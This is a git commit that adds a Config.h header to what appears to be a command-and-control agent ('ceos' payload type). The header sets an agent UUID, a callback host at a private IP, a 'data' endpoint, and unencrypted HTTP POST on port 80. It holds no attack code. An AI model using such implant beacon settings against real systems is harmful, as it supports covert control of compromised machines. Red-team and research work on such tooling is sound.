ad293c5ca0fe009aee1790d520f5878d5d020392
zkclown <zkclown@sncf.red>
2024-04-16 10:29:51 +0200

    Add config.h

---
+++ Payload_Type/ceos/ceos/agent_code/ceos/include/Config.h
@@ -0,0 +1,11 @@
+#pragma once
+#define initUUID "f7e9ab2b-e538-48c4-9bd3-6224d0ff7e4e"
+#define hostname L"172.16.64.18"
+#define endpoint L"data"
+#define ssl FALSE
+#define proxyenabled FALSE
+#define proxyurl L""
+
+#define useragent L""
+#define httpmethod L"POST"
+#define port 80
